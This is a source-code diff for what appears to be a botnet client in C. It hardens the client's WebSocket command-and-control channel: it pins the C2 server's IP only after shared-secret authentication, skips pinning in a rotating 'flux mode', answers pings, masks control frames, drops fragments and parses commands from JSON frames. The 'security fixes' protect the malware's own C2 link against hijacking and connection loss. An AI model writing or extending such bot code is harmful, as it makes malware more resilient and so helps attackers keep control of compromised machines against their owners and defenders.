@@ -2179,15 +2179,13 @@ int ws_connect(notnet_bot_t *bot) {
     
     bot->c2_ws.sock = sock;
     bot->c2_ws.connected = 1;
-    /* SECURITY FIX (#10): Pin IP on first successful WS connection.
-     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
-    if (!bot->flux_enabled && !bot->c2_ws.dns_pinned) {
-        struct sockaddr_in sin;
-        socklen_t slen = sizeof(sin);
-        getpeername(sock, (struct sockaddr *)&sin, &slen);
-        bot->c2_ws.pinned_addr = sin.sin_addr;
-        bot->c2_ws.dns_pinned = 1;
-    }
+    /* SECURITY FIX (#45/#85): Do NOT pin the peer IP here on the raw
+     * pre-authentication connect. An on-path attacker who answers the
+     * first DNS resolution for the WS host would get pinned as the
+     * trusted C2 endpoint for the process lifetime, permanently
+     * defeating the rebinding protection above. Pinning happens only
+     * after the first frame that passes the shared-secret gate proves
+     * this peer is the real C2 (WS poll path), mirroring the HTTP fix. */
     log_info("WS: connected to %s:%d", bot->c2_ws.server, bot->c2_ws.port);
     
     return 0;
@@ -2214,6 +2212,49 @@ static void ws_apply_mask(uint8_t *data, size_t len, const uint8_t *mask) {
     for (size_t i = 0; i < len; i++) {
         data[i] ^= mask[i % 4];
     }
+}
+
+/* AUDIT FIX (#260): masked client-to-server CONTROL frame sender.
+ * RFC 6455 §5.1 requires ALL client frames to be masked, but the close
+ * reply was sent as a bare {0x88, 0x00} and pings were never answered.
+ * Sends opcode 0x8 (close) or 0xA (pong) with a fresh masking key,
+ * echoing up to 125 bytes of payload (control-frame cap, §5.5).
+ * Returns 0 on success, -1 on error. */
+static int ws_send_control(notnet_bot_t *bot, uint8_t opcode,
+                           const uint8_t *payload, size_t plen) {
+    if (!bot->c2_ws.connected) return -1;
+    if (plen > 125) return -1;
+
+    uint8_t header[2 + 4];
+    int hdr_len = 0;
+    /* FIN bit set + control opcode */
+    header[hdr_len++] = (uint8_t)(0x80 | opcode);
+    /* Masking bit set (client-to-server), 7-bit length (plen <= 125) */
+    uint8_t mask[4];
+    ws_make_mask(mask);
+    header[hdr_len++] = (uint8_t)(0x80 | plen);
+    memcpy(header + hdr_len, mask, 4);
+    hdr_len += 4;
+
+    uint8_t masked[125];
+    if (plen > 0 && payload) {
+        memcpy(masked, payload, plen);
+        ws_apply_mask(masked, plen, mask);
+    }
+
+    int sent = chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)header, hdr_len);
+    if (sent < 0) {
+        log_warn("ws_send_control: header send failed: %s", strerror(errno));
+        return -1;
+    }
+    if (plen > 0) {
+        sent = chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)masked, (int)plen);
+        if (sent < 0) {
+            log_warn("ws_send_control: payload send failed: %s", strerror(errno));
+            return -1;
+        }
+    }
+    return 0;
 }
 
 int ws_send(notnet_bot_t *bot, const char *data, int len) {
@@ -2352,7 +2393,6 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
 
     int fin = (frame_hdr[0] & 0x80) >> 7;
     int opcode = frame_hdr[0] & 0x0F;
-    (void)fin;  /* FIN bit: not checking fragmentation (C2 messages are small) */
     int masked = (frame_hdr[1] & 0x80) >> 7;
     uint8_t payload_len = frame_hdr[1] & 0x7F;
 
@@ -2431,15 +2471,39 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
         }
     }
 
-    /* Handle control frames (close, ping, pong) by returning 0 */
+    /* AUDIT FIX (#260): fragmentation is not reassembled — a non-final
+     * data frame or a continuation fragment used to fall through to the
+     * JSON command path and be parsed as a complete command. The payload
+     * was fully drained above; drop the fragment instead. */
+    if (!fin || opcode == 0x0) {
+        log_warn("WS: %s (fin=%d, opcode=0x%X) dropped — fragmentation not reassembled",
+                 opcode == 0x0 ? "continuation fragment" : "non-final frame",
+                 fin, opcode);
+        return 0;
+    }
+
+    /* Handle control frames (close, ping, pong) by returning 0.
+     * AUDIT FIX (#260): a received Ping MUST be answered with a Pong
+     * carrying the same payload (RFC 6455 §5.5.3) — liveness-checking
+     * peers time out and drop a healthy connection otherwise — and ALL
+     * client-to-server frames, including the close reply, must be masked
+     * (§5.1); strict servers terminate on unmasked client frames. */
     if (opcode == 0x8 || opcode == 0x9 || opcode == 0xA) {
         if (opcode == 0x8) {
-            /* Close frame - send close frame back and disconnect */
-            uint8_t close_frame[] = { 0x88, 0x00 };
-            chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)close_frame, 2);
+            /* Close frame - send masked close frame back and disconnect */
+            ws_send_control(bot, 0x8, NULL, 0);
+        }
+        if (opcode == 0x9) {
+            /* Ping - reply with Pong echoing the same payload */
+            int echo = total <= 125 ? total : 125;
+            if (ws_send_control(bot, 0xA, (const uint8_t *)buf, (size_t)echo) == 0) {
+                log_info("WS: answered ping (%d bytes) with pong", echo);
+            }
         }
         return 0;
     }
+
+    if (total <= 0) return -1;
 
     buf[total] = '\0';
     return total;
@@ -2609,6 +2673,21 @@ int protocol_process_commands(notnet_bot_t *bot) {
             /* SECURITY FIX (#35): Same auth gate as HTTP — only trust
              * frames that echo the shared secret. */
             if (http_body_has_secret(bot, ws_buf)) {
+                /* SECURITY FIX (#45/#85): Pin the peer IP on the first
+                 * *authenticated* frame instead of on the raw connect.
+                 * A frame that echoes the shared secret is the earliest
+                 * evidence this peer is the real C2 — mirror of the HTTP
+                 * post-auth pin. Flux mode skips it (peer IP rotates). */
+                if (!bot->flux_enabled && !bot->c2_ws.dns_pinned) {
+                    struct sockaddr_in sin;
+                    socklen_t slen = sizeof(sin);
+                    if (getpeername(bot->c2_ws.sock, (struct sockaddr *)&sin, &slen) == 0) {
+                        bot->c2_ws.pinned_addr = sin.sin_addr;
+                        bot->c2_ws.dns_pinned = 1;
+                        log_info("WS: DNS pin set to %s after first authenticated frame",
+                                 inet_ntoa(sin.sin_addr));
+                    }
+                }
                 /* SECURITY FIX (#120): extract cmd/args from the JSON frame
                  * instead of queueing the raw frame — dispatch matches
                  * command prefixes, so the raw JSON was never executed. */
